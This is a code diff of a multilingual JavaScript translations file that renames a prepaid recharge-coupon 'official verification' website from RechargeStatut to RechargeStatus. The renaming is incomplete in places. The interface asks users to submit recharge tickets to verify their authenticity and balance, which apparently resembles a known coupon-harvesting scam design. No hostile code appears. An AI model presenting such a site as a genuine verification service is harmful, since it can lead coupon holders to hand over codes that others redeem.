@@ -1,10 +1,10 @@
 // ===== CONFIGURATION DES TRADUCTIONS =====
 const translations = {
   fr: {
-    title: "RechargeStatut.com | Vérification Officielle",
+    title: "RechargeStatus.com | Vérification Officielle",
     nav_home: "Accueil",
     status_operational: "Système de vérification opérationnel",
-    hero_title: "Bienvenue sur RechargeStatut.com",
+    hero_title: "Bienvenue sur RechargeStatus.com",
     hero_subtitle: "Vérifiez rapidement l’authenticité et le solde de vos tickets de recharge en toute sécurité.",
     counter_text: "Utilisateurs nous font confiance",
     btn_explore: "Commencer maintenant",
@@ -36,7 +36,7 @@ const translations = {
     form_oui: "Oui",
     form_non: "Non",
     form_envoyer: "Authentifier ",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Vérification de coupons prépayés.",
     footer_link_verify: "Vérifier",
     footer_link_faq: "FAQ",
@@ -44,7 +44,7 @@ const translations = {
     footer_copyright: "© 2026 RechargeStatut.com. Tous droits réservés."
   },
   pt: {
-    title: "RechargeStatut.com | Verificação Oficial",
+    title: "RechargeStatus.com | Verificação Oficial",
     nav_home: "Início",
     status_operational: "Sistema de verificação operacional",
     hero_title: "Bem-vindo ao RechargeStatut.com",
@@ -84,13 +84,13 @@ const translations = {
     footer_link_verify: "Verificar",
     footer_link_faq: "FAQ",
     footer_link_contact: "Contacto",
-    footer_copyright: "© 2026 RechargeStatut.com. Todos os direitos reservados."
+    footer_copyright: "© 2026 RechargeStatus.com. Todos os direitos reservados."
   },
   en: {
-    title: "RechargeStatut.com | Official Verification",
+    title: "RechargeStatus.com | Official Verification",
     nav_home: "Home",
     status_operational: "Verification system operational",
-    hero_title: "Welcome to RechargeStatut.com",
+    hero_title: "Welcome to RechargeStatus.com",
     hero_subtitle: "Quickly verify the authenticity and balance of your recharge tickets securely.",
     counter_text: "Users trust us",
     btn_explore: "Start Now",
@@ -122,7 +122,7 @@ const translations = {
     form_oui: "Yes",
     form_non: "No",
     form_envoyer: "Authenticate ",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Prepaid  verification.",
     footer_link_verify: "Verify",
     footer_link_faq: "FAQ",
@@ -130,10 +130,10 @@ const translations = {
     footer_copyright: "© 2026 RechargeStatut.com. All rights reserved."
   },
   es: {
-    title: "RechargeStatut.com | Verificación Oficial",
+    title: "RechargeStatus.com | Verificación Oficial",
     nav_home: "Inicio",
     status_operational: "Sistema de verificación operativo",
-    hero_title: "Bienvenido a RechargeStatut.com",
+    hero_title: "Bienvenido a RechargeStatus.com",
     hero_subtitle: "Verifique rápidamente la autenticidad y el saldo de sus tarjetas de recarga de forma segura.",
     counter_text: "Usuarios confían en nosotros",
     btn_explore: "Empezar ahora",
@@ -170,7 +170,7 @@ const translations = {
     footer_link_verify: "Verificar",
     footer_link_faq: "FAQ",
     footer_link_contact: "Contacto",
-    footer_copyright: "© 2026 RechargeStatut.com. Todos los derechos reservados."
+    footer_copyright: "© 2026 RechargeStatus.com. Todos los derechos reservados."
   },
   de: {
     title: "RechargeStatut.com | Offizielle Prüfung",
@@ -202,13 +202,13 @@ const translations = {
     footer_link_verify: "Prüfen",
     footer_link_faq: "FAQ",
     footer_link_contact: "Kontakt",
-    footer_copyright: "© 2026 RechargeStatut.com. Alle Rechte vorbehalten."
+    footer_copyright: "© 2026 RechargeStatus.com. Alle Rechte vorbehalten."
   },
   it: {
-    title: "RechargeStatut.com | Verifica Ufficiale",
+    title: "RechargeStatus.com | Verifica Ufficiale",
     nav_home: "Home",
     status_operational: "Sistema di verifica operativo",
-    hero_title: "Benvenuto su RechargeStatut.com",
+    hero_title: "Benvenuto su RechargeStatus.com",
     hero_subtitle: "Verifica rapidamente l'autenticità e il saldo dei tuoi biglietti di ricarica in totale sicurezza.",
     counter_text: "Utenti si fidano di noi",
     btn_explore: "Inizia ora",
@@ -240,12 +240,12 @@ const translations = {
     form_oui: "Sì",
     form_non: "No",
     form_envoyer: "Autentica ",
-    footer_brand_name: "RechargeStatut",
+    footer_brand_name: "RechargeStatus",
     footer_brand_text: "Verifica coupon prepagati.",
     footer_link_verify: "Verifica",
     footer_link_faq: "FAQ",
     footer_link_contact: "Contatto",
-    footer_copyright: "© 2026 RechargeStatut.com. Tutti i diritti riservati."
+    footer_copyright: "© 2026 RechargeStatus.com. Tutti i diritti riservati."
   }
 };
 
